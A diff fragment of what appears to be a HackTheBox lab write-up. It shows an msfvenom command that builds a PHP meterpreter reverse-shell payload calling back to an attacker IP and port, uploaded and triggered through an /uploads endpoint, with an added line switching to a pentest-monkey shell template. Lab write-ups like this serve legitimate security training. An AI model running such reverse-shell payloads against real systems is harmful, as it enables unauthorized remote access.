@@ -92,8 +92,11 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.26 lport=1337 -f raw > re
 
 11. Set a listener on port 1337, then upload the file.
 12. Next, to trigger the reverse shell, let's opened the file we already within this endpoint --> `/uploads/reverse_shell.htb`.
+13. Anyway, somehow i failed to get the shell using the template from msfvenom. So i used the template from pentest-monkeys.
 
 > RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bbbfe336-c293-41f1-ac0a-cc67723edfd0)
 
 
 ## USER FLAG
